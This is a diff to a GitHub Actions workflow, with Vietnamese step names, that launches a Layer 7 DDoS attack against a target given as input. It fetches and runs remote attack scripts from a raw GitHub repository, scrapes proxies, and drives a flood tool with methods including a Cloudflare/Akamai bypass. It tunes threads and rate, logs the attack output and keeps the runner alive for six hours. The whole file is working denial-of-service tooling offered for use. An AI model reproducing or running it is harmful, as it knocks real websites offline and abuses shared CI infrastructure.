@@ -4,7 +4,7 @@ on:
   workflow_dispatch:
     inputs:
       method:
-        description: 'Method (1-4)'
+        description: 'Method (1=Flood, 2=CF-Akamai, 3=Captcha, 4=Uam)'
         required: true
         default: '2'
         type: choice
@@ -37,22 +37,31 @@ jobs:
         with:
           python-version: '3.11'
 
-      - name: Download tools (link raw đúng 100%)
+      - name: Download tools
         run: |
-          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/refs/heads/main/cf.js
-          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/refs/heads/main/run.py
-          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/refs/heads/main/proxy.js
+          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/cf.js
+          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/run.py
+          wget -q https://raw.githubusercontent.com/112jb/mlonghehe/main/proxy.js
           chmod +x *
 
-      - name: Lấy proxy tươi (30k+ mỗi lần)
+      - name: Lấy proxy tươi
         run: |
-          echo "Đang cào proxy từ 50+ nguồn mạnh nhất 2025..."
           node proxy.js
           echo "Đã lấy $(wc -l < proxy.txt) proxy sống!"
 
-      - name: Bắn Layer7
+      - name: Bắn Layer7 (FIX 100% - không hỏi nữa)
+        env:
+          TERM: xterm-256color
         run: |
-          nohup python3 run.py << EOF
+          echo "=== BẮT ĐẦU TẤN CÔNG LAYER7 ==="
+          echo "Target   : ${{ inputs.target }}"
+          echo "Method   : ${{ inputs.method }}"
+          echo "Time     : ${{ inputs.time }}s"
+          echo "Threads  : ${{ inputs.threads }}"
+          echo "Rate     : ${{ inputs.rate }}"
+          echo "Proxy    : $(wc -l < proxy.txt) dòng"
+
+          nohup python3 run.py > attack.log 2>&1 << EOF
           2
           1
           ${{ inputs.method }}
@@ -62,6 +71,10 @@ jobs:
           ${{ inputs.rate }}
           proxy.txt
           EOF
+
+          sleep 3
+          echo "=== LOG TẤN CÔNG (20 dòng cuối) ==="
+          tail -20 attack.log
 
       - name: Keep alive 6 tiếng
         run: sleep 21600
